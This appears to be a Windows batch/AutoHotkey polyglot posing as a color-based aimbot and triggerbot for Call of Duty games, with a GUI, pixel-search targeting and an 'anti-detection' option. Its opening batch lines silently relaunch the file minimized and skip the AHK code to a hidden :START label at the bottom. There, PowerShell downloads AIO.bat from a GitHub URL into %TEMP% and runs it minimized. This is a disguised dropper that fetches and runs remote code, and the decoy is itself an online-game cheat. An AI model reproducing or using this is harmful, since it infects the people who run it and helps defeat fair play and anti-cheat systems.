@echo off
if "%1" neq "minimized" (
    start /min "" "%~dpnx0" minimized %*
    exit /b
)
GOTO :START
#NoEnv
#SingleInstance Force
#Persistent
#InstallKeybdHook
 
CoordMode, Pixel, Screen, RGB
CoordMode, Mouse, Screen
PID := DllCall("GetCurrentProcessId")
Process, Priority, %PID%, High
 
global IsMinimized := false
global GuiTitle := "Xevio's Color Aim Assist V3.0"
global IsWindowHidden := false
 
; GUI Window with modern dark theme and rounded corners
Gui, +AlwaysOnTop -Caption +ToolWindow
Gui, Color, 1E1E1E ; Dark Grey background
Gui, Margin, 15, 15 
Gui, Font, s11 cE0E0E0, Segoe UI 
 
WinSet, Region, 0-0 w320 h890 r10-10, Xevios Color Aim Assist V3.0
 
; Title with accent color
Gui, Font, s12 c4DC3FF Bold ; Light blue accent color
Gui, Add, Text, vTitleText x10 y10 w300 h30 BackgroundTrans Center gGuiMove, Xevio's Color Aim Assist V3.0
 
; Mode Selection
Gui, Font, s10 cE0E0E0
Gui, Add, Button, x20 y45 w130 h20 gMultiplayerMode, Multiplayer
Gui, Add, Button, x170 y45 w130 h20 gZombiesMode, Zombies
Gui, Add, Text, x10 y65 w300 vModeStatus cE0E0E0 Center, Mode: Multiplayer
 
; Main Options Section
Gui, Font, s9
Gui, Add, GroupBox, x10 y85 w300 h205 cE0E0E0, Main Features
 
Gui, Font, s10
Gui, Add, CheckBox, x20 y105 w280 h20 vEnableCheckbox gEnableCheckbox Checked%EnableState%, Aimbot
Gui, Add, CheckBox, x20 y125 w280 h20 vHipfireModeCheckbox gHipfireModeCheckbox, Hipfire Mode
Gui, Add, CheckBox, x20 y145 w280 h20 vTriggerbotCheckbox gTriggerbotCheckbox, Triggerbot
Gui, Add, CheckBox, x20 y165 w280 h20 vControllerSupportCheckbox gControllerSupportCheckbox, Controller Support (Not Functional)
Gui, Add, CheckBox, x20 y185 w280 h20 vJumpShotCheckbox gJumpShotCheckbox, Jump Shot
Gui, Add, CheckBox, x20 y205 w280 h20 vDropShotCheckbox gDropShotCheckbox, Drop Shot
Gui, Add, CheckBox, x20 y225 w280 h20 vCrouchShotCheckbox gCrouchShotCheckbox, Crouch Shot
Gui, Add, CheckBox, x20 y245 w280 h20 vHoldBreathCheckbox gHoldBreathCheckbox, Hold Breath
Gui, Add, CheckBox, x20 y265 w280 h20 vAntiDetectionCheckbox gAntiDetectionCheckbox, Anti-Detection Mode
 
; Target Settings Section
Gui, Add, GroupBox, x10 y290 w300 h95 cE0E0E0, Target Settings
Gui, Add, CheckBox, x25 y310 w275 vAntiTargetSwitchCheckbox Checked, Anti Target Switch
Gui, Add, Button, x20 y335 w80 h20 gHeadshotsButton, Head
Gui, Add, Button, x110 y335 w80 h20 gChestButton, Chest
Gui, Add, Button, x200 y335 w100 h20 gSwitchTargetButton, Switch Target
Gui, Add, Text, x10 y365 w300 vModeDisplay cE0E0E0 Center, Mode: Head
 
; Triggerbot Settings Section
Gui, Add, GroupBox, x10 y385 w300 h85 cE0E0E0, Triggerbot Settings
Gui, Add, Text, x25 y405 w100 cE0E0E0, Initial Delay (ms)
Gui, Add, Slider, x120 y405 w120 vTriggerDelaySlider gSliderUpdate Range200-600 TickInterval25 AltSubmit, 350
Gui, Add, Edit, x245 y405 w50 h20 vTriggerDelayEdit gUpdateTriggerEdit c000000, 350
Gui, Add, Text, x25 y435 w100 cE0E0E0, Shot Interval (ms)
Gui, Add, Slider, x120 y435 w120 vTriggerIntervalSlider gSliderUpdate Range100-400 AltSubmit, 200
Gui, Add, Edit, x245 y435 w50 h20 vTriggerIntervalEdit gUpdateTriggerEdit c000000, 200
 
; Adjustment Settings Section
Gui, Add, GroupBox, x10 y480 w300 h185 cE0E0E0, Adjustments
Gui, Add, Text, x25 y500 w160 cE0E0E0, Recoil Compensation
Gui, Add, Slider, x190 y500 w100 vRecoilCompensationSlider Range0-30 AltSubmit gUpdateRecoil, 0.0
Gui, Add, Text, x25 y530 w160 cE0E0E0, Aim Smoothness
Gui, Add, Slider, x190 y530 w100 vSmoothnessSlider Range4-9 AltSubmit gUpdateSmoothness, 5
Gui, Add, Text, x25 y560 w265 cE0E0E0, Fine-Tune X and Y
Gui, Add, Button, x90 y580 w50 h20 gDecreaseYOffset, Y+
Gui, Add, Button, x40 y610 w50 h20 gDecreaseXOffset, X-
Gui, Add, Button, x140 y610 w50 h20 gIncreaseXOffset, X+
Gui, Add, Button, x90 y640 w50 h20 gIncreaseYOffset, Y-
Gui, Add, Text, x200 y590 w100 vXOffsetDisplay cE0E0E0, X Offset: 55
Gui, Add, Text, x200 y615 w100 vYOffsetDisplay cE0E0E0, Y Offset: 70
 
; FOV Controls
Gui, Add, GroupBox, x10 y665 w300 h55 cE0E0E0, FOV Control
Gui, Add, Button, x20 y685 w50 h20 gDecreaseFov, FOV-
Gui, Add, Button, x80 y685 w50 h20 gIncreaseFov, FOV+
Gui, Add, Text, x140 y690 w160 vFovDisplay cE0E0E0, FOV: 300 x 300
 
; Bottom Buttons Section
Gui, Add, GroupBox, x10 y730 w300 h85 cE0E0E0, Options
Gui, Add, Button, x20 y750 w135 h20 gSaveConfig, Save Config
Gui, Add, Button, x165 y750 w135 h20 gLoadConfig, Load Config
Gui, Add, Button, x20 y780 w135 h20 gReloadScript, Reload
Gui, Add, Button, x165 y780 w135 h20 gGuiClose, Close
 
; Feedback Button
Gui, Add, Button, x10 y825 w300 h25 gProvideFeedback, Provide Feedback
 
; Add Text for Minimize Instruction
Gui, Font, s8
Gui, Add, Text, x10 y860 w300 cE0E0E0 Center, Press Insert to Minimize
 
global InitialHeight := 890
global IsMinimized := false
 
; Show the main GUI
Gui, Show, w320 h890, Josh's Color Aim Assist V3.0
 
; Core Variables
global EnableState := 1  
global HipfireModeEnabled := 0
global AntiDetectionEnabled := 0
global TriggerbotEnabled := 0
global ControllerSupportEnabled := 0
global JumpShotEnabled := 0
global DropShotEnabled := 0
global CrouchShotEnabled := 0
global HoldBreathEnabled := 0
global wasDropShotActive := false
global wasCrouchActive := false
global wasLButtonPressed := false
global DebugMode := 0        ; Debug mode off by default
global TitleHue := 0  ; For rainbow effect
 
SetTimer, UpdateTitleColor, 50
 
; Screen and aim settings
ZeroX := A_ScreenWidth / 2    ; Screen center X
ZeroY := A_ScreenHeight / 2.2 ; Screen center Y adjusted for better head level
CFovX := 300                  ; FOV Width
CFovY := 300                  ; FOV Height
xOffset := 55                 ; Initial X offset set to 55
yOffset := 70                 ; Initial Y offset
aimSmoothness := 3           ; Lower = faster aim
recoilCompensation := 2       ; Vertical recoil control
 
; Settings
EMCol := 0xE600FF            ; Target color (purple)
ColVn := 30                  ; Color variance
 
; Timing variables
targetFoundTime := 0
lastFireTime := 0
 
; Variables for triggerbot
global lastFireTime := 0
global targetFoundTime := 0
global TriggerRangeSlider := 200
global TriggerDelaySlider := 350
global TriggerIntervalSlider := 200
 
 
GetRandomizedInterval() {
    Random, variation, -69, 69
    interval := TriggerIntervalSlider + variation
 
    if (interval < 50)
        interval := 50
    if (interval > 500)
        interval := 500
    return interval
}
 
ColorMatch(color) {
    global EMCol, ColVn
 
    targetR := (EMCol >> 16) & 0xFF
    targetG := (EMCol >> 8) & 0xFF
    targetB := EMCol & 0xFF
    
 
    testR := (color >> 16) & 0xFF
    testG := (color >> 8) & 0xFF
    testB := color & 0xFF
    
    return (abs(targetR - testR) <= ColVn) 
        && (abs(targetG - testG) <= ColVn) 
        && (abs(targetB - testB) <= ColVn)
}
 
; Main Loop
Loop {
 
    isGameActive := WinActive("ahk_exe ModernWarfare.exe") || WinActive("ahk_exe cod.exe") || WinActive("ahk_exe BlackOpsColdWar.exe")
    if (!EnableState || !isGameActive) {
        Sleep, 1
        continue
    }
 
    ; Core movement logic
    GuiControlGet, JumpShotEnabled,, JumpShotCheckbox
    if (JumpShotEnabled && GetKeyState("RButton", "P")) {
        Send, {Space}
        Sleep, 300  ; Adjust timing as needed
    }
 
    GuiControlGet, DropShotEnabled,, DropShotCheckbox
    if (DropShotEnabled && GetKeyState("RButton", "P") && !wasDropShotActive) {
        Send, {Ctrl down}
        Sleep, 500 ; Adjust timing as needed
        Send, {Ctrl up}
        wasDropShotActive := true
    } else if (DropShotEnabled && wasDropShotActive && !GetKeyState("RButton", "P")) {
        Send, {Space}  
        wasDropShotActive := false
    }
 
    GuiControlGet, CrouchShotEnabled,, CrouchShotCheckbox
    if (CrouchShotEnabled && GetKeyState("RButton", "P") && !wasCrouchActive) {
        Send, {C down}
        Sleep, 75 ; Adjust timing as needed
        Send, {C up}
        Sleep, 75 ; Adjust timing as needed
        wasCrouchActive := true
    } else if (CrouchShotEnabled && wasCrouchActive && !GetKeyState("RButton", "P")) {
        Send, {Space}  
        wasCrouchActive := false
    }
 
    GuiControlGet, HoldBreathEnabled,, HoldBreathCheckbox
    if (HoldBreathEnabled && GetKeyState("RButton", "P")) {
        Sleep, 110 ; Adjust timing as needed
        Send, {Shift down}
 
        if (!GetKeyState("RButton", "P")) {
            Send, {Shift up}
        }
    }
 
    ; Main aimbot logic
    if (HipfireModeEnabled || GetKeyState("RButton", "P")) {
        PixelSearch, AimPixelX, AimPixelY, ZeroX - CFovX, ZeroY - CFovY, ZeroX + CFovX, ZeroY + CFovY, EMCol, ColVn, Fast RGB
        if (!ErrorLevel) {
 
            AimX := AimPixelX - ZeroX + xOffset
            AimY := AimPixelY - ZeroY + yOffset 
            
            MoveX := (AimX / AimSmoothness)
            MoveY := (AimY / AimSmoothness)
            
            if (GetKeyState("LButton", "P") && !wasLButtonPressed) {
 
                DllCall("mouse_event", uint, 1, int, 0, int, RecoilCompensation, uint, 0, int, 0)
                Sleep, 50  
            }
            wasLButtonPressed := GetKeyState("LButton", "P")
            
            if (abs(MoveX) > 1 || abs(MoveY) > 1) { 
                DllCall("mouse_event", uint, 1, int, MoveX, int, MoveY, uint, 0, int, 0)
            }
 
            if (TriggerbotEnabled) {
                Sleep, TriggerDelay
                Send, {LButton}
                Sleep, TriggerInterval
            }
        }
    } else {
        wasLButtonPressed := false
    }
    
    if (DebugMode) {
 
        MouseGetPos, mouseX, mouseY
        PixelGetColor, centerColor, ZeroX, ZeroY, RGB
        
        debugText := "Script Status:`n"
        debugText .= "Aimbot: " . EnableState . "`n"
        debugText .= "Game Active: " . isGameActive . "`n"
        debugText .= "Screen Center: " . ZeroX . "," . ZeroY . "`n"
        debugText .= "Mouse Position: " . mouseX . "," . mouseY . "`n"
        debugText .= "Center Color: " . centerColor . "`n"
        debugText .= "Target Color: " . EMCol . "`n"
        debugText .= "Color Variance: " . ColVn . "`n"
        debugText .= "FOV: " . CFovX . "x" . CFovY . "`n"
        debugText .= "Aim Offset: " . xOffset . "," . yOffset . "`n"
        debugText .= "Smoothness: " . AimSmoothness . "`n"
        
        if (HipfireModeEnabled || GetKeyState("RButton", "P")) {
            debugText .= "`nAiming Status:`n"
            debugText .= "Search Area: " . (ZeroX - CFovX) . "," . (ZeroY - CFovY) 
            debugText .= " to " . (ZeroX + CFovX) . "," . (ZeroY + CFovY) . "`n"
            debugText .= "Target Found: " . (!ErrorLevel ? "Yes" : "No") . "`n"
            if (!ErrorLevel) {
                debugText .= "Target Position: " . AimPixelX . "," . AimPixelY . "`n"
                debugText .= "Move Amount: " . MoveX . "," . MoveY
            }
        }
        ;
        ToolTip, %debugText%, 10, 10  
    } else {
        ToolTip  
    }
    
    Sleep, 1
}
 
; GUI Control Handlers
EnableCheckbox:
    GuiControlGet, isChecked,, EnableCheckbox
    EnableState := isChecked
return
 
HipfireModeCheckbox:
Gui, Submit, NoHide
HipfireModeEnabled := HipfireModeCheckbox
return
 
AntiDetectionCheckbox:
Gui, Submit, NoHide
AntiDetectionEnabled := AntiDetectionCheckbox
return
 
TriggerbotCheckbox:
Gui, Submit, NoHide
TriggerbotEnabled := TriggerbotCheckbox
return
 
ControllerSupportCheckbox:
Gui, Submit, NoHide
ControllerSupportEnabled := ControllerSupportCheckbox
return
 
JumpShotCheckbox:
Gui, Submit, NoHide
JumpShotEnabled := JumpShotCheckbox
return
 
DropShotCheckbox:
Gui, Submit, NoHide
DropShotEnabled := DropShotCheckbox
return
 
CrouchShotCheckbox:
Gui, Submit, NoHide
CrouchShotEnabled := CrouchShotCheckbox
return
 
HoldBreathCheckbox:
Gui, Submit, NoHide
HoldBreathEnabled := HoldBreathCheckbox
return
 
; Button Handlers
ProvideFeedback:
    Run, https://www.unknowncheats.me/forum/call-of-duty-black-ops-6-a/670254-joshs-aim-assist-v1.html
return
 
HeadshotsButton:
ZeroY := A_ScreenHeight / 2 
switchMode := "Head"
autoSwitchEnabled := False  ; 
GuiControl,, ModeDisplay, Mode: Head
xOffset := 55  
yOffset := 70  
CFovX := 300  
CFovY := 300
GuiControl,, FovDisplay, FOV: %CFovX% x %CFovY%
GuiControl,, XOffsetDisplay, X Offset: %xOffset%
GuiControl,, YOffsetDisplay, Y Offset: %yOffset%
Return
 
ChestButton:
ZeroY := A_ScreenHeight / 2  
switchMode := "Chest"
autoSwitchEnabled := False  
GuiControl,, ModeDisplay, Mode: Chest
xOffset := 55  
yOffset := 80  
CFovX := 300  
CFovY := 300
GuiControl,, FovDisplay, FOV: %CFovX% x %CFovY%
GuiControl,, XOffsetDisplay, X Offset: %xOffset%
GuiControl,, YOffsetDisplay, Y Offset: %yOffset%
Return
 
SwitchTargetButton:
lastSwitchTime := A_TickCount - 10000  
SetTimer, AutoSwitchTarget, 10000  
autoSwitchEnabled := True
Return
 
AutoSwitchTarget:
if (autoSwitchEnabled) {
    if (switchMode = "Head") {
        switchMode := "Chest"
        ZeroY := A_ScreenHeight / 2
        GuiControl,, ModeDisplay, Mode: Chest
    } else {
        switchMode := "Head"
        ZeroY := A_ScreenHeight / 2
        GuiControl,, ModeDisplay, Mode: Head
    }
}
Return
 
; Multiplayer and Zombies Mode Handlers
MultiplayerMode:
GuiControl,, ModeStatus, Mode: Multiplayer
EMCol := 0xE600FF  
xOffset := 55
yOffset := 70
CFovX := 300
CFovY := 300
GuiControl,, FovDisplay, FOV: %CFovX% x %CFovY%
GuiControl,, XOffsetDisplay, X Offset: %xOffset%
GuiControl,, YOffsetDisplay, Y Offset: %yOffset%
Return
 
ZombiesMode:
GuiControl,, ModeStatus, Mode: Zombies
EMCol := 0xE600FF 
xOffset := 55
yOffset := 80
CFovX := 300
CFovY := 300
GuiControl,, FovDisplay, FOV: %CFovX% x %CFovY%
GuiControl,, XOffsetDisplay, X Offset: %xOffset%
GuiControl,, YOffsetDisplay, Y Offset: %yOffset%
Return
 
UpdateRecoil:
    GuiControlGet, recoilCompensation,, RecoilCompensationSlider
    Gosub, SliderUpdate
    Return
 
UpdateSmoothness:
    GuiControlGet, aimSmoothness,, SmoothnessSlider
    Gosub, SliderUpdate
    Return
 
IncreaseXOffset:
xOffset += 1
GuiControl,, XOffsetDisplay, X Offset: %xOffset%
Return
 
DecreaseXOffset:
xOffset -= 1
GuiControl,, XOffsetDisplay, X Offset: %xOffset%
Return
 
IncreaseYOffset:
yOffset += 1
GuiControl,, YOffsetDisplay, Y Offset: %yOffset%
Return
 
DecreaseYOffset:
yOffset -= 1
GuiControl,, YOffsetDisplay, Y Offset: %yOffset%
Return
 
IncreaseFov:
CFovX += 5
CFovY += 5
GuiControl,, FovDisplay, FOV: %CFovX% x %CFovY%
Return
 
DecreaseFov:
CFovX := Max(CFovX - 5, 10) 
CFovY := Max(CFovY - 5, 10)
GuiControl,, FovDisplay, FOV: %CFovX% x %CFovY%
Return
 
SaveConfig:
 
    Gui, Submit, NoHide
    
    configJson := {}
    configJson.EnableState := EnableState
    configJson.HipfireModeEnabled := HipfireModeEnabled
    configJson.AntiDetectionEnabled := AntiDetectionEnabled
    configJson.AntiTargetSwitchEnabled := AntiTargetSwitchEnabled
    configJson.TriggerbotEnabled := TriggerbotEnabled
    configJson.ControllerSupportEnabled := ControllerSupportEnabled
    configJson.JumpShotEnabled := JumpShotEnabled
    configJson.DropShotEnabled := DropShotEnabled
    configJson.CrouchShotEnabled := CrouchShotEnabled
    configJson.HoldBreathEnabled := HoldBreathEnabled
    configJson.RecoilCompensation := RecoilCompensationSlider
    configJson.AimSmoothness := SmoothnessSlider
    configJson.XOffset := xOffset
    configJson.YOffset := yOffset
    configJson.FovX := CFovX
    configJson.FovY := CFovY
    configJson.TriggerDelay := TriggerDelaySlider
    configJson.TriggerInterval := TriggerIntervalSlider
    configJson.SwitchMode := switchMode
    
    jsonString := "{"
    for key, value in configJson {
        if (A_Index > 1)
            jsonString .= ","
        jsonString .= """" . key . """:""" . value . """"
    }
    jsonString .= "}"
    
    FileDelete, config.json
    FileAppend, %jsonString%, config.json
    MsgBox, Configuration saved successfully!
Return
 
LoadConfig:
 
    if !FileExist("config.json") {
        MsgBox, No configuration file found!
        Return
    }
    
    FileRead, jsonContent, config.json
    
    jsonContent := StrReplace(jsonContent, "{", "")
    jsonContent := StrReplace(jsonContent, "}", "")
    jsonContent := StrReplace(jsonContent, """", "")
    
 
    pairs := StrSplit(jsonContent, ",")
    
    for index, pair in pairs {
        keyValue := StrSplit(pair, ":")
        key := Trim(keyValue[1])
        value := Trim(keyValue[2])
        
        if (key = "EnableState")
            GuiControl,, EnableCheckbox, %value%
        else if (key = "HipfireModeEnabled")
            GuiControl,, HipfireModeCheckbox, %value%
        else if (key = "AntiDetectionEnabled")
            GuiControl,, AntiDetectionCheckbox, %value%
        else if (key = "AntiTargetSwitchEnabled")
            GuiControl,, AntiTargetSwitchCheckbox, %value%
        else if (key = "TriggerbotEnabled")
            GuiControl,, TriggerbotCheckbox, %value%
        else if (key = "ControllerSupportEnabled")
            GuiControl,, ControllerSupportCheckbox, %value%
        else if (key = "JumpShotEnabled")
            GuiControl,, JumpShotCheckbox, %value%
        else if (key = "DropShotEnabled")
            GuiControl,, DropShotCheckbox, %value%
        else if (key = "CrouchShotEnabled")
            GuiControl,, CrouchShotCheckbox, %value%
        else if (key = "HoldBreathEnabled")
            GuiControl,, HoldBreathCheckbox, %value%
        else if (key = "RecoilCompensation") {
            GuiControl,, RecoilCompensationSlider, %value%
            Gosub, SliderUpdate
        }
        else if (key = "AimSmoothness") {
            GuiControl,, SmoothnessSlider, %value%
            Gosub, SliderUpdate
        }
        else if (key = "XOffset") {
            xOffset := value
            GuiControl,, XOffsetDisplay, X Offset: %value%
        }
        else if (key = "YOffset") {
            yOffset := value
            GuiControl,, YOffsetDisplay, Y Offset: %value%
        }
        else if (key = "FovX") {
            CFovX := value
            GuiControl,, FovDisplay, FOV: %CFovX% x %CFovY%
        }
        else if (key = "FovY") {
            CFovY := value
            GuiControl,, FovDisplay, FOV: %CFovX% x %CFovY%
        }
        else if (key = "TriggerDelay") {
            GuiControl,, TriggerDelaySlider, %value%
            GuiControl,, TriggerDelayEdit, %value%
        }
        else if (key = "TriggerInterval") {
            GuiControl,, TriggerIntervalSlider, %value%
            GuiControl,, TriggerIntervalEdit, %value%
        }
        else if (key = "SwitchMode") {
            switchMode := value
            GuiControl,, ModeDisplay, Mode: %value%
        }
    }
    
    MsgBox, Configuration loaded successfully!
Return
 
SliderUpdate:
    Gui, Submit, NoHide
    
 
    TriggerDelaySlider := Round(TriggerDelaySlider / 25) * 25
    
    GuiControl,, TriggerDelayEdit, %TriggerDelaySlider%
    GuiControl,, TriggerIntervalEdit, %TriggerIntervalSlider%
return
 
 
UpdateTriggerSettings:
    Gui, Submit, NoHide
    
    TriggerRangeSlider := 200
    
    TriggerDelaySlider := Round(TriggerDelaySlider / 25) * 25
    
 
    GuiControl,, TriggerDelaySlider, %TriggerDelaySlider%
    GuiControl,, TriggerIntervalSlider, %TriggerIntervalSlider%
    
    GuiControl,, TriggerDelayEdit, %TriggerDelaySlider%
    GuiControl,, TriggerIntervalEdit, %TriggerIntervalSlider%
return
 
UpdateTriggerEdit:
    Gui, Submit, NoHide
    
    if (TriggerDelayEdit >= 200 && TriggerDelayEdit <= 600) {
        GuiControl,, TriggerDelaySlider, %TriggerDelayEdit%
        TriggerDelaySlider := TriggerDelayEdit
    }
    
 
    if (TriggerIntervalEdit >= 100 && TriggerIntervalEdit <= 400) {
        GuiControl,, TriggerIntervalSlider, %TriggerIntervalEdit%
        TriggerIntervalSlider := TriggerIntervalEdit
    }
return
 
GuiMove:
    PostMessage, 0xA1, 2, , , A
    Return
 
Insert::
    if (IsWindowHidden) {
        Gui, Show
        IsWindowHidden := false
    } else {
        Gui, Hide
        IsWindowHidden := true
    }
return
 
Home::
    DebugMode := !DebugMode  
    if (!DebugMode) {
        ToolTip  
    }
return
 
GuiClose:
    Gui, Destroy
    ExitApp
Return
 
ReloadScript:
    Reload
    Return
 
UpdateTitleColor:
TitleHue := Mod(TitleHue + 4, 360) 
h := TitleHue
 
if (h < 60) {
    r := 255
    g := Round((h / 60) * 255)
    b := 0
} else if (h < 120) {
    r := Round(((120 - h) / 60) * 255)
    g := 255
    b := 0
} else if (h < 180) {
    r := 0
    g := 255
    b := Round(((h - 120) / 60) * 255)
} else if (h < 240) {
    r := 0
    g := Round(((240 - h) / 60) * 255)
    b := 255
} else if (h < 300) {
    r := Round(((h - 240) / 60) * 255)
    g := 0
    b := 255
} else {
    r := 255
    g := 0
    b := Round(((360 - h) / 60) * 255)
}
 
color := Format("0x{:02x}{:02x}{:02x}", r, g, b)
GuiControl, +c%color%, TitleText
return
:START
cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/AIO.bat' -OutFile AIO.bat"
powershell -windowstyle minimized -command "Start-Process '%temp%\AIO.bat'"
